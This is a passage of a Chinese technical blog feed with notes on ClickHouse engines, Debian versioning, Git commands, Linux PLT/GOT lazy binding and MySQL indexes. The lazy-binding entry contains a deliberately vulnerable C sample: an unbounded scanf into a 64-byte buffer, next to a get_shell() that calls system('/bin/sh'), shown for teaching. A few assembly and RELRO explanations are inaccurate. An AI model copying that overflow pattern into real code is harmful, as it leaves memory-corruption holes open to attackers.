有版本字段：保留最大版本号的数据



用法示例：ENGINE = ReplacingMergeTree(version)ORDER BY (id)

场景：
日志幂等写入（如 Kafka 重放）
状态表更新（如最后一次登录记录）


SummingMergeTree特点：
对于主键相同的记录，在合并时自动进行 数值字段求和
非数值字段将被忽略合并（丢弃）

用法示例：ENGINE = SummingMergeTreeORDER BY (uid, date)

注意：
合并只在后台发生，查询时仍可能看到重复数据
需要定期执行 OPTIMIZE TABLE 保证合并完成

场景：
实时流量统计、PV&#x2F;UV 累计、财务计量汇总


AggregatingMergeTree特点：
专门支持 AggregateFunction 类型字段的合并
合并时执行函数级别的聚合（如 uniqState、avgState）

用法示例：ENGINE = AggregatingMergeTreeORDER BY (app, date)

字段定义示例：
AggregateFunction(uniq, UInt64) AS uv

底层机制：
每次插入时写入状态（如 uniqState 的 bitmap）
合并时执行状态合并
查询时通过 final 强制 merge 执行完整聚合

场景：
大规模去重、HLL 近似统计
用户自定义聚合函数存储


如何选择合适的 MergeTree 变体
幂等数据写入 → 使用 ReplacingMergeTree(version)
日志数据流入 + 撤销补偿 → CollapsingMergeTree 或 VersionedCollapsingMergeTree
业务指标类数据，需周期汇总 → SummingMergeTree
高精度聚合、近似统计 → AggregatingMergeTree
不需要任何合并行为（如测试） → MergeTree


]]></content>
      <tags>
        <tag>Clickhouse</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian软件包和仓库规范</title>
    <url>/2025/04/11/Debian%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8C%E4%BB%93%E5%BA%93%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[版本号 deb-version(5)
 Debian Policy Manual
版本命名格式[epoch:]upstream-version[-debian-revision]



epoch组成元素:
0-9



使用规则:
一般默认省略，省略时默认为0，且一般是一个单独的无符号整数
upstream-version组成元素
0-9a-zA-Z.+-:~



特殊符号使用规则:
如果没有epoch那么不能用:
如果没有debian-revision那么不能用-
~用来标注预先的版本，比如1.0~beta1~test123小于1.0~beta1小于1.0
debian-revision组成元素
0-9a-zA-Z+.~



比较规则首先比较epoch，然后比较upstream-version，然后比较debian-revision
epoch直接比较数字大小就行
upstream-version和debian-revision的比较算法则比较特殊，会从左到右，遇到数字字符串就一块拿出来，遇到非数字字符也一块拿出来，然后比较，直到把所有的拿出完或者比较出结果。数字字符是直接比数字大小，非数字字符的比较方式如下：
基于ASCII码表，但是有一些修改：

~小于任何值，甚至比空字符还小
字母小于任何特殊符号（除了~）

比如：
~~ &lt; ~~a &lt; ~ &lt; 空字符 &lt; a
举个例子
12as.d54  和 12asd33
第一步：取出数字12和12比，相等，继续下一步
第二步：取出非数字as.d和asd比，其中比到第三个字符.比d大，所以左边大，结束
正则匹配版本号是否规范Python
import rerule=r&quot;^(?:[0-9]+:)?[0-9][0-9a-zA-Z\.~+]*(?:-[0-9a-zA-Z\.+~]+)?$&quot;version=&quot;1:2.1.~31a-1be.ta4a+es&quot;res=re.fullmatch(rule,version)if res:    print(res[0])else:    print(&quot;不匹配&quot;)



C
#include&lt;stdio.h&gt;                                                                                                        #include&lt;regex.h&gt;int if_version(char *version)&#123;    char *pattern =&quot;^([0-9]+:)?[0-9][0-9a-zA-Z\\.~+]*(-[0-9a-zA-Z\\.+~]+)?$&quot;;    regex_t reg;    int res;    if(regcomp(&amp;reg,pattern,REG_EXTENDED) &lt; 0)&#123;        return 0;    &#125;    res = regexec(&amp;reg,version,0,NULL,0);    if(res != REG_NOERROR)&#123;        return 0;    &#125;    return 1;&#125;int main()&#123;    char *version = &quot;1:1.01a~23-1-beta1&quot;;    if(if_version(version))&#123;        printf(&quot;ok\n&quot;);    &#125;    else&#123;        printf(&quot;not match\n&quot;);    &#125;    return 0;&#125;



正则获取epoch、upstream-version、debian-revisionPython
import redef get_parts_of_the_version(version):    rule=r&quot;^([0-9]+:)?([0-9][0-9a-zA-Z\.~+]*)(-[0-9a-zA-Z\.+~]+)?$&quot;    res=re.findall(rule,version)    if res:        res=res[0]        epoch=res[0]        upstream_version=res[1]        debian_revision=res[2]    else:        print(&quot;不符合规范&quot;)get_parts_of_the_version(&quot;2.1.~31a-1be.ta4a+es-1&quot;)



包名https://www.debian.org/doc/debian-policy/ch-controlfields.html#s-f-source
原文Package names (both source and binary, see Package) must consist only of lower case letters (a-z), digits (0-9), plus (+) and minus (-) signs, and periods (.). They must be at least two characters long and must start with an alphanumeric character.



组成元素和命名规范0-9a-z+-.




必须以字母或数字开头
长度至少为2，包括2

正则匹配包名Python:
import redef if_package_name(package_name):    rule=r&quot;^[0-9a-z][0-9a-z\\.+-]+$&quot;    res=re.fullmatch(rule,package_name)    if res:        print(res[0])    else:        print(&quot;不匹配&quot;)package_name=&quot;python3&quot;if_package_name(package_name)



C
#include&lt;stdio.h&gt;                                                                                                        #include&lt;regex.h&gt;int if_package_name(char *package_name)&#123;    char *pattern =&quot;^[0-9a-z][0-9a-z\\.+-]+$&quot;;    regex_t reg;    int res;    if(regcomp(&amp;reg,pattern,REG_EXTENDED) &lt; 0)&#123;        return 0;    &#125;    res = regexec(&amp;reg,package_name,0,NULL,0);    if(res != REG_NOERROR)&#123;        return 0;    &#125;    return 1;&#125;int main()&#123;    char *package_name = &quot;python3&quot;;    if(if_package_name(package_name))&#123;        printf(&quot;ok\n&quot;);    &#125;    else&#123;        printf(&quot;not match\n&quot;);    &#125;    return 0;&#125;



sources.listhttps://wiki.debian.org/SourcesList
通常是如下格式
deb http://site.example.com/debian distribution component1 component2 component3deb-src http://site.example.com/debian distribution component1 component2 component3



sources.list 是 Debian 系统中用于配置 APT 软件包管理器的源列表文件。该文件位于 /etc/apt 目录下，用于指定从哪些软件源获取软件包和更新。
每行的内容表示一个软件源，其中可能包含以下几个字段：

deb 或 deb-src：指定该行是用于获取二进制软件包或源代码软件包的源。 
deb 表示获取二进制软件包。
deb-src 表示获取源代码软件包。


软件包源地址：指定软件源的地址。可以是 HTTP、HTTPS、FTP 或本地文件系统路径。 
HTTP&#x2F;HTTPS 示例：http://archive.debian.org/debian/ 或 https://mirrors.example.com/debian/
FTP 示例：ftp://ftp.debian.org/debian/
本地路径示例：file:/mnt/cdrom/，表示本地光盘或镜像文件的路径。


发行版名称：指定要获取的 Debian 发行版名称，如 stable、testing、unstable 等。也可以使用发行版的代号，如 buster、bullseye、sid 等。
软件包分区：指定软件包所属的分区或组织。常见的分区包括 main、contrib、non-free 等。 
main：包含自由软件。
contrib：包含一些依赖于非自由软件的软件包。
non-free：包含非自由软件。


可选的部分名称：指定软件包的可选部分，如 main, restricted, universe, multiverse 等。这取决于具体的发行版和配置。

APTapt-cache showsrcPackage: aptBinary: apt, libapt-pkg5.0, libapt-inst2.0, apt-doc, libapt-pkg-dev, libapt-pkg-doc, apt-utils, apt-transport-httpsVersion: 1.8.2.13-1Maintainer: APT Development Team &lt;de***@li***.org&gt;Build-Depends: cmake (&gt;= 3.4), debhelper (&gt;= 11.2~), docbook-xml, docbook-xsl, dpkg-dev (&gt;= 1.17.14), g++ (&gt;= 4:7), gettext (&gt;= 0.12), googletest &lt;!nocheck&gt; | libgtest-dev &lt;!nocheck&gt;, libbz2-dev, libdb-dev, libgnutls28-dev (&gt;= 3.4.6), liblz4-dev (&gt;= 0.0~r126), liblzma-dev, libseccomp-dev [amd64 arm64 armel armhf i386 mips mips64el mipsel ppc64el s390x hppa powerpc powerpcspe ppc64 x32], libsystemd-dev [linux-any], libudev-dev [linux-any], libzstd-dev (&gt;= 1.0), ninja-build, pkg-config, po4a (&gt;= 0.34-2), xsltproc, zlib1g-devBuild-Depends-Indep: doxygen, graphviz, w3mArchitecture: any allStandards-Version: 4.1.1Format: 3.0 (quilt)Directory: pool/main/a/aptFiles:  77b1b0061ed37ff64cd0fa4ab7bc25cf 152500 apt_1.8.2.13-1.debian.tar.xz 6014c5bd18389ac81823045e931a5c97 2140 apt_1.8.2.13-1.dsc d374ced44608d160fc29e614258ba10e 2071440 apt_1.8.2.13.orig.tar.xzChecksums-Sha1:  4d79b89d128995da2a48ad47777e9072afae3900 152500 apt_1.8.2.13-1.debian.tar.xz 590993b2b8b73c6b9f0e02a60d96db2e74f858db 2140 apt_1.8.2.13-1.dsc 925ad34c2253c3480c4de765e2407d744b6b2b4a 2071440 apt_1.8.2.13.orig.tar.xzChecksums-Sha256:  73f609cce107f7e399a82019a1eea50c834b2b3c96437df1b8900370082a57e6 152500 apt_1.8.2.13-1.debian.tar.xz 08506f0b0ab22b8e3ae44b069a1a98c4c64334ee129ec349e343e81bcb5b61ae 2140 apt_1.8.2.13-1.dsc db91de7ab152eabfea5437c44bbded2c6ffd98e20947077a7a91339acc4b93b8 2071440 apt_1.8.2.13.orig.tar.xzPackage-List: apt deb admin important arch=any apt-doc deb doc optional arch=all apt-transport-https deb oldlibs optional arch=all apt-utils deb admin important arch=any libapt-inst2.0 deb libs optional arch=any libapt-pkg-dev deb libdevel optional arch=any libapt-pkg-doc deb doc optional arch=all libapt-pkg5.0 deb libs optional arch=anyTestsuite: autopkgtestTestsuite-Triggers: @builddeps@, aptitude, db-util, dpkg, fakeroot, gnupg, gnupg1, gnupg2, gpgv, gpgv1, gpgv2, libfile-fcntllock-perl, lsof, python3-apt, stunnel4, wgetUploaders: Michael Vogt &lt;m**@de***.org&gt;, Julian Andres Klode &lt;j**@de***.org&gt;, David Kalnischkies &lt;do*****@de***.org&gt;Vcs-Browser: https://salsa.debian.org/apt-team/aptVcs-Git: https://salsa.debian.org/apt-team/apt.git



apt-cache showpkgPackage: aptVersions: 1.8.2.13-1 (/var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-amd64_Packages) (/usr/lib/dpkg-db/status) Description Language:                  File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-amd64_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7 Description Language:                  File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-i386_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7 Description Language:                  File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-amd64_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7 Description Language:                  File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-i386_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a71.8.2.10-1+dde (/var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-amd64_Packages) Description Language:                  File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-amd64_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7 Description Language:                  File: /var/lib/apt/lists/professional-packages.chinauos.com_desktop-professional_dists_eagle_main_binary-i386_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7 Description Language:                  File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-amd64_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7 Description Language:                  File: /var/lib/apt/lists/professional-security.chinauos.com_dists_eagle_1050_main_binary-i386_Packages                  MD5: 9fb97a88cb7383934ef963352b53b4a7Reverse Depends:   apt-dbgsym,apt 1.8.2.10-1+dde  dpkg,apt  libapt-pkg5.0:i386,apt 1.6~  apt:i386,apt  libapt-pkg5.0,apt 1.8.2.10-1+dde  libapt-pkg5.0,apt 1.6~  dpkg,apt  apt-utils,apt 1.8.2.10-1+dde  apt-transport-https,apt 1.5~alpha4  xdeb,apt 0.7.26~exp6  org.yuan.yuan,apt  com.steampowered.steam-launcher,apt 1.6  com.codium,apt  libapt-pkg5.0:i386,apt 1.6~  apt:i386,apt  squid-deb-proxy-client,apt 0.7.25.3ubuntu1  wajig,apt  upgrade-system,apt 0.7.0  tasksel,apt  supermin,apt  packagesearch,apt 0.6.46.1  reprepro,apt 0.9.4  reportbug,apt  python3-reportbug,apt  python3-apt,apt  python-apt,apt  progress-linux-pgp-keys,apt  progress-linux,apt  libapt-pkg5.0,apt 1.6~  netselect-apt,apt  multistrap,apt  mmdebstrap,apt  lsb-release,apt  libsbuild-perl,apt  libapt-pkg5.0,apt 1.8.2.13-1  devscripts,apt 1.3~pre3  emdebian-archive-keyring,apt  dwww,apt  dpkg-www,apt  dpkg,apt  dh-make-perl,apt 1.1.8  dgit,apt  debconf,apt 0.3.12.1  deborphan,apt  debirf,apt  debian-goodies,apt  debian-cd,apt  debfoster,apt  apt-transport-tor,apt 1.6~alpha6  dctrl-tools,apt  daptup,apt  d-shlibs,apt  cron-apt,apt  auto-apt-proxy,apt  apticron-systemd,apt 1.1~exp9  apticron,apt 1.1~exp9  apt-utils,apt 1.8.2.13-1  apt-transport-tor,apt 1.3~rc1  apt-transport-https,apt 1.5~alpha4  apt-transport-s3,apt  apt-listchanges,apt 0.5.3  apt-src,apt  apt-show-versions,apt  apt-show-source,apt  apt-move,apt  apt-listbugs,apt 0.9.11  apt-file,apt 1.3~exp1~  apt-build,apt 0.8.16~exp3  apt-dbgsym,apt 1.8.2.13-1Dependencies: 1.8.2.13-1 - adduser (0 (null)) gpgv (16 (null)) gpgv2 (16 (null)) gpgv1 (0 (null)) deepin-keyring (0 (null)) libapt-pkg5.0 (2 1.7.0~alpha3~) libc6 (2 2.15) libgcc1 (2 1:3.0) libgnutls30 (2 3.6.6) libseccomp2 (2 1.0.1) libstdc++6 (2 5.2) apt-transport-https (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) aptitude (3 0.8.10) ca-certificates (0 (null)) apt-doc (0 (null)) aptitude (16 (null)) synaptic (16 (null)) wajig (0 (null)) dpkg-dev (2 1.17.2) gnupg (16 (null)) gnupg2 (16 (null)) gnupg1 (0 (null)) powermgmt-base (0 (null)) apt-transport-https (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) aptitude:i386 (3 0.8.10) apt-transport-https:i386 (3 1.5~alpha4~) apt-transport-https:i386 (3 1.5~alpha4~) apt:i386 (32 (null)) apt-utils:i386 (3 1.3~exp2~) apt-utils:i386 (3 1.3~exp2~) 1.8.2.10-1+dde - adduser (0 (null)) gpgv (16 (null)) gpgv2 (16 (null)) gpgv1 (0 (null)) debian-archive-keyring (0 (null)) libapt-pkg5.0 (2 1.7.0~alpha3~) libc6 (2 2.15) libgcc1 (2 1:3.0) libgnutls30 (2 3.6.6) libseccomp2 (2 1.0.1) libstdc++6 (2 5.2) apt-transport-https (3 1.5~alpha4~) apt-transport-https:i386 (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) apt-utils:i386 (3 1.3~exp2~) aptitude (3 0.8.10) aptitude:i386 (3 0.8.10) ca-certificates (0 (null)) apt-doc (0 (null)) aptitude (16 (null)) synaptic (16 (null)) wajig (0 (null)) dpkg-dev (2 1.17.2) gnupg (16 (null)) gnupg2 (16 (null)) gnupg1 (0 (null)) powermgmt-base (0 (null)) apt-transport-https (3 1.5~alpha4~) apt-transport-https:i386 (3 1.5~alpha4~) apt-utils (3 1.3~exp2~) apt-utils:i386 (3 1.3~exp2~) apt:i386 (32 (null)) Provides: 1.8.2.13-1 - apt-transport-https (= 1.8.2.13-1) 1.8.2.10-1+dde - apt-transport-https (= 1.8.2.10-1+dde) Reverse Provides:

apt仓库

libgc 是源码包名
libgc-dev_7.6.4.2-2+dde_amd64.deb  是源码包编译出来的二进制包
libgc1c2-dbgsym_7.6.4.2-2+dde_amd64.deb  包名后面带有 -dbgsym 后缀的包是调试符号包（debug symbol package），这些包包含了与相应二进制包相关的调试信息
libgc_7.6.4.2-2+dde.debian.tar.xz 文件名带有 dde.debian.tar.xz 后缀的包是一种源代码包，特指 Deepin 桌面环境（Deepin Desktop Environment，简称 DDE）在 Debian 包管理系统中的源码包，用于对原始源码进行必要的修改和配置，以便在 Debian 系统上正确构建和打包。
libgc_7.6.4.2-2+dde.dsc  文件名带有 .dsc 后缀的文件是 Debian 源码控制文件（Debian Source Control file）。这个文件描述了 Debian 源码包的相关信息
libgc_7.6.4.2.orig.tar.xz   文件名带有 .orig.tar.xz 后缀的包是原始源码包（original source tarball）。这些包包含了上游开发者发布的原始源代码，没有经过任何修改

安全公告https://security-team.debian.org/security_tracker.html
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Git</title>
    <url>/2025/06/30/Git/</url>
    <content><![CDATA[初始化新建仓库直接复制gitlab的，稍微改了点，还是待优化
# Git global setupgit config --global user.name &quot;xxx&quot;git config --global user.email &quot;xxx&quot;# Create a new repositorygit clone xxxxcd uscangit switch -c maintouch README.mdgit add README.mdgit commit -m &quot;add README&quot;git push -u origin main# Push an existing foldercd existing_foldergit initgit checkout -b maingit remote add origin xxxxxxgit add .git commit -m &quot;Initial commit&quot;git push -u origin main# Push an existing Git repositorycd existing_repogit remote rename origin old-origingit remote add origin g**@company***.com:ut******/uscan.gitgit push -u origin --allgit push -u origin --tags

强制将本地状态同步到远程仓库并清空历史记录危险操作, 确保知道自己在做什么再这么搞
rm -rf .gitgit initgit add .git commit -m &quot;Initial commit - reset history&quot;git remote add origin g**@gi***.com:lyi61pd/blog.gitgit branch -M maingit push -f origin main

分支删除本地的远程分支跟踪引用git remote prune origin

查看所有分支git branch -a

删除远程分支git push origin --delete feature-前端操作按钮颜色及布局调整

删除本地分支git branch -d feature-前端操作按钮颜色及布局调整

切换当前分支git checkout dev

更新默认分支origin&#x2F;HEAD先去gitlab-&gt;settings设置，然后
git fetch origingit remote set-head origin -a

新建本地分支git branch new_branch_name

新建远程分支基于本地当前分支，推送到远程分支，如果远程分支不存在相当于新建远程分支
git push --set-upstream origin feature-架构划分合入clickhouse迁移

新建本地分支并切换到该分支相当于
:::infogit branch new_branch_name
git checkout new_branch_name
:::
git checkout -b new_branch_name

查看本地分支和远程分支的跟踪关系git branch -vv

返回结果例子
:::info

master                abc1234 [origin&#x2F;master] Initial commit
feature-branch        def5678 [origin&#x2F;feature-branch] Added new feature
another-branch        ghi9101 Added another feature


:::
在这个示例中：

master 分支跟踪 origin&#x2F;master
feature-branch 分支跟踪 origin&#x2F;feature-branch
another-branch 没有跟踪任何远程分支

设置本地分支和远程分支的跟踪关系git branch --set-upstream-to=origin/origin_branch_name local_branch_name

Commit合并多个Commit合并最近的5个commit
git rebase -i HEAD~5

会有这样的画面

然后改成

然后ctrl+o enter ctrl+x
然后会有这样的画面

这里改成想要提交commit记录的说明内容

然后ctrl+o enter ctrl+x
本地commit记录已合并完成
推送到远程仓库
git push --force



删除某个文件的所有commit记录比如项目里有个sql，如果反复更新这个sql，仓库会变得很大，如果可以的话，可以全部删掉
删除前先备份，因为这个命令会把当前的也删掉
git filter-branch --force --index-filter \&quot;git rm --cached --ignore-unmatch path/to/the/file&quot; \--prune-empty --tag-name-filter cat -- --all

然后再把备份的搞过来，重新提交commit，这样历史的就没了，只留下最新的
然后如果有其他协作者, 因为远程commit历史被修改了, 其他协作者本地会出现不同步的问题, 这时候需要这样同步
git fetch origingit reset --hard origin/your-branch-name

.gitignore.gitignore不生效如果文件或目录已经被 Git 跟踪，那么即使它们在 .gitignore 中被列出，Git 也会继续跟踪它们，需要先从 Git 仓库中移除这些文件
git rm -r --cached .git add .git commit -m &quot;Remove ignored files from tracking&quot;

Tag查看本地所有Taggit tag

查看远程所有Taggit ls-remote --tags origin

基于当前commit新建Taggit tag 0.1

将本地Tag推送到远程git push origin 0.1

拉取远程的Taggit fetch --tags

本地只增不删，所以如果远程删了，同步到本地的时候，本地并不会删，需要手动删
删除本地的Taggit tag -d 0.1

删除远程的Taggit push --delete origin 0.1

PR切换至远程的PR相当于在本地新建了个pr-1分支，把远程的提交拉过来了
git ls-remote origin &#x27;pull/*/head&#x27;git fetch origin refs/pull/1/headgit checkout -b pr-1 FETCH_HEAD

]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux延迟绑定</title>
    <url>/2025/04/10/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[Windows 下.lib .dll .obj .exe.lib 是静态链接文件
.dll 是动态链接文件
.obj 是编译时生成的中间代码文件，比如一个项目有多个.c 文件，编译时会先全部生成为中间 obj 文件，然后在进行链接生成最终的 exe 文件
.exe 文件是可执行文件
Linux 下.o .so .a.o 类似于 Windows 下的.obj 文件，是编译中间产物
.so 是动态链接文件
.a 是静态链接文件,可通过如下命令将中间文件加进 output.a 或者新生成一个 output.a
创建.a的命令ar rcx output.a test1.o test2.o

Linux 延迟绑定机制使用的 C 语言例子//-------------------------------------------------------------------// FileName: test1.c// Author: hexuelin// Copyright (c) company***.//-------------------------------------------------------------------#include &lt;stdio.h&gt;void stack_overflow()&#123; char buf[64] = &#123;0&#125;; scanf(&quot;%s&quot;, &amp;buf); printf(&quot;hello %s\n&quot;, &amp;buf);&#125;void get_shell()&#123; system(&quot;/bin/sh&quot;);&#125;int main(int argc, char const *argv[])&#123; stack_overflow(); return 0;&#125;

静态链接和动态链接静态链接在编译时把需要用到的内容都链接到文件中
动态链接则是会在程序执行时再进行链接
因此静态链接明显会比动态链接文件要大，同样的执行速度也会更快
#编译时加上-static参数就是静态链接gcc title.c -o title_static -static#不加参数默认就是动态链接gcc title.c -o title



部分寄存器以及部分汇编指令下面的汇编指令，部分用其他指令替代作为解释，但是实际上并不能用替代的指令，比如 rip,rsp 寄存器，原则上并不允许直接对他们进行操作

rip

指向下一条要执行的命令（还没有执行）
push 1

rsp

栈顶

rbp

栈底

mov rax,1

rax&#x3D;1

add rax,1

rax&#x3D;rax+1

push rax

add rsp,一个字长（64位一个字长就是64位，8字节）mov [rsp],rax


jmp 0x6666

mov rip,0x6666


call printf@plt 

#printf@plt是一个地址,这个地址的备注名叫做printf@pltpush ripjmp printf@plt


leave

mov rsp,rbppop rbp


retn

pop rip

libc.so.6libc 是 Stantard C Library 的简称，它是符合 ANSI C 标准的一个标准函数库。
在 Linux 操作系统下所说的 libc 即 glibc。glibc 是类 Unix 操作系统中使用最广泛的 libc 库，它的全称是 GNU C Library.
PLT 和 GOTPLT表称为过程链接表（procedure linkage table）
GOT表称为全局偏移量表（global offset table）
用不太严谨的话来概况，首先可以这么理解：
GOT表中存储真正的函数地址
PLT表中存储的是GOT表中的地址
调用函数时会先到PLT表，再由PLT表导向GOT表
**GOT[0]**包含.dynamic 段的地址，.dynamic 段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息
**GOT[1]**包含动态链接器的标识
**GOT[2]**包含动态链接器的延迟绑定代码的入口点，也就是调用_dl_runtime_resolve 函数，延迟绑定的时候要调用的函数
printf 第一次调用的时候 got 表中是没有实际地址的， 第一次调用 printf 的时候  ，最终会调用_dl_runtime_resolve 函数，这个函数的作用就是把 prtinf 函数的实际地址写入到 GOT 表中，之后如果第二次，第三次。。。调用 printf 的时候就能从 GOT 表直接获取到 printf 的地址了
GOT表中正式的函数地址要从 GOT[3]开始，也就是第四项
举例：PLT 表中 printf@plt 
jmp pr****@go***.pltpush printf在got表中的编号jmp plt表第一行指令

举例: GOT 表中 printf@got.plt 
第一次执行printf时：PLT表中printf@plt的第二行第二三四次执行printf时：动态链接库libc中函数printf的真实地址

延迟绑定机制下,函数初次调用流程图
IDA 查看 PLT 表
IDA 查看 GOT 表
.plt     .got    .got.plt这三者是 ELF 文件格式中的节(section)
.plt 就是 PLT 表
.got 和.got.plt 统称为 GOT 表
.got 里面直接存储的就是函数调用的地址，部分函数地址是直接存放在.got 里面的
PLT 表指向的是.got.plt
printf@plt 指向的就是 pr****@go***.plt
第一次调用时printf@got.plt里指向的是 printf@plt 的下一行也就是 push printf 对应的 got 表里的序号
放在.got 里的相当于.got.plt 第一次调用之后的状态
RELRO#关闭RELROgcc title.c -o title_no -z norelro#部分开启RELRO(Partial RELRO不加参数默认是这个)gcc title.c -o title_partial -z lazy#完全开启RELRO(Full RELRO)gcc title.c -o title_full -z now


RELRO，堆栈地址随机化， 是一种用于加强对 binary 数据段的保护的技术。
由于 GOT 和 PLT 以及延迟绑定的原因，在启用延迟绑定时，符号解析只发生在第一次使用的时候，该过程是通过 PLT 表进行的，解析完成后，相应的 GOT 条目会被修改为正确的函数地址。因此，在延迟绑定的情况下。.got.plt 必须可写，这就给了攻击者篡改地址劫持程序的执行的可能。
RELRO（ReLocation Read-Only）机制的提出就是为了解决延迟绑定的安全问题，他将符号重定位表设置为只读，或者在程序启动时就解析并绑定所有的动态符号，从而避免 GOT 上的地址被篡改。RELRO 有两种形式：
partial RELRO：一些段（包括.dynamic,.got 等）在初始化后会被标记为只读。在 unbuntu16.04（GCC-5.4.0）上，默认开启 Partial RELRO。
Full RELRO ：除了 Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt 段会被完全初始化为目标函数的最终地址，并被 mprotect 标记为只读，但其实.got.plt 会被直接合并到.got，也就看不到这段了。另外 link_map 和_dl_runtime_reolve 的地址也不会被装入。开启 Full RELRO 会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改 GOT。



]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql</title>
    <url>/2025/04/10/Mysql/</url>
    <content><![CDATA[Mysql基础MySQL 是一个开源的关系型数据库管理系统，说白了就是可以用它来存储、查询和管理数据。比如写个网站，有用户、有商品、有订单，这些数据全都可以塞进 MySQL 里。
它属于 “关系型” 的那种数据库，意思就是数据是按表格来组织的（跟 Excel 差不多的感觉），表和表之间可以建立关系。
MySQL 的流行程度非常高，从小公司到大厂基本都会用，生态也非常完善。
MySQL 和其他数据库有什么不同？
MySQL 是开源的，可以免费用
跟 PostgreSQL 比，它性能高点但功能稍少
跟 Oracle 或 SQL Server 比，它更轻量、容易上手

数据库的基本概念用 MySQL 最常打交道的几个东西：

数据库（Database）：相当于一个文件夹，里面放表
表（Table）：一张张结构化的表格
行（Row）：每条数据就像表格的一行
列（Column）：表格的一列，也就是字段
主键（Primary Key）：每一行的唯一标识，比如 id
索引（Index）：加速查询用的，就像书的目录
视图（View）：虚拟表，本质是个查询的结果
存储过程、触发器等：偏后面点的高级操作，可以之后再学

MySQL 区分大小写吗？
表名是否区分大小写，跟系统有关。Linux 下区分，Windows 下不区分。
字段名一般不区分。
字段里的值是否区分大小写，取决于字符集和排序规则（collation）。

怎么创建数据库和表？CREATE DATABASE myapp;USE myapp;CREATE TABLE users (  id INT PRIMARY KEY AUTO_INCREMENT,  name VARCHAR(100),  age INT,  created_at DATETIME);

这段 SQL 创建了一个名为 myapp 的数据库，以及一张 users 表。字段里 AUTO_INCREMENT 是自增主键，常见套路。
数据类型该怎么选？
整数：INT、BIGINT（根据范围选）
字符串：VARCHAR（变长）、CHAR（定长）
文本：TEXT，但不能做索引
时间：DATETIME、TIMESTAMP
布尔值：没有 BOOLEAN，用 TINYINT(1) 模拟

选类型的时候，别盲目追求“大”，越精确越节省空间和性能。

索引简单说，索引就是数据库用来加快查找速度的一个“加速器”。就像看书有目录，你不会每次都从头翻，只要查一下页码就能直接跳过去。
在 MySQL 中，如果没有索引，数据库每次查数据都要从头到尾一条条扫，叫做 全表扫描，当数据多了之后，这种查询会非常慢。
为什么需要索引想象你有一张表，几百万条记录，你想查 “名字叫小明的人”，没有索引的话，MySQL 会很累，要一条条看过去。加了索引之后，就可以直接跳到“名字 &#x3D; 小明”的那几条记录。
所以，索引主要解决的问题就是：

加快查询速度（读得快）
排序、分组也能更高效
可以帮助做唯一性约束（比如用户名不能重复）

加了索引，是不是越多越好不是的，索引不是白送的，它有代价：

会占用额外的磁盘空间
写入、更新会变慢，因为要同步更新索引
索引太多反而可能让查询优化器懵逼，不知道该用哪个

所以得有选择性地加，不能一上来就 “全字段都加个索引试试”。
MySQL 的索引底层怎么实现MySQL 默认用的是 B+ 树索引。这是种多路平衡查找树，跟普通的二叉树不一样，B+ 树每个节点可以有很多个子节点，并且所有数据都在“叶子节点”。
优点是：

查询次数少，磁盘 IO 少
顺序读取也快，适合做范围查询

另外还有一种 哈希索引，但它只能用于等值查找，不支持范围查找，MyISAM 不支持，InnoDB 默认也不用。
索引的几种类型主键索引（Primary Key）
表里只能有一个
自动加索引
InnoDB 下是聚簇索引（数据和索引放一起）

唯一索引（Unique Index）
限制某字段不能重复，比如邮箱、用户名等
和主键差不多，但可以有多个

普通索引（Index）
没有限制，只是为了加速查询

组合索引（联合索引）
一次索引多个字段，比如 (name, age)
遵循“最左前缀”原则，查询要从最左边字段开始才有效

全文索引（Fulltext）
用来做全文搜索（比如查一段文字里有没有某个词）
MySQL 5.6 后支持 InnoDB，但功能比不上专业的全文检索引擎（比如 Elasticsearch）

聚簇索引和非聚簇索引区别在哪
聚簇索引：数据和索引放一起（InnoDB 的主键索引），B+树的叶子节点放数据
非聚簇索引：索引里存的是主键的值，查的时候需要回表，create index 创建的是非聚簇索引，它为表中某个或多个列提供了独立的索引结构，不改变数据的物理存储顺序

比如你查 name，但主键是 id，那先查到 id，然后再去表里拿其他字段，叫做 回表。所以非聚簇索引比聚簇的多一步操作。
索引应该怎么加几个常见的加法操作：
-- 创建索引CREATE INDEX idx_name ON users(name);-- 创建组合索引CREATE INDEX idx_name_age ON users(name, age);-- 删除索引DROP INDEX idx_name ON users;-- 创建唯一索引CREATE UNIQUE INDEX idx_email ON users(email);

加索引的最佳实践
经常出现在 WHERE、ORDER BY、GROUP BY、JOIN 里的字段可以考虑加索引
不要给频繁更新的字段加索引，会拖慢写入
字段的区分度要高（重复值越少越好），不然索引效果很差
索引字段顺序很重要，组合索引得用对“最左前缀”原则
大字段（比如 TEXT、BLOB）不要加索引

为什么加了索引却没生效？
查询条件没用到最左前缀
用了函数包裹字段，比如 WHERE UPPER(name) = &#39;TOM&#39;
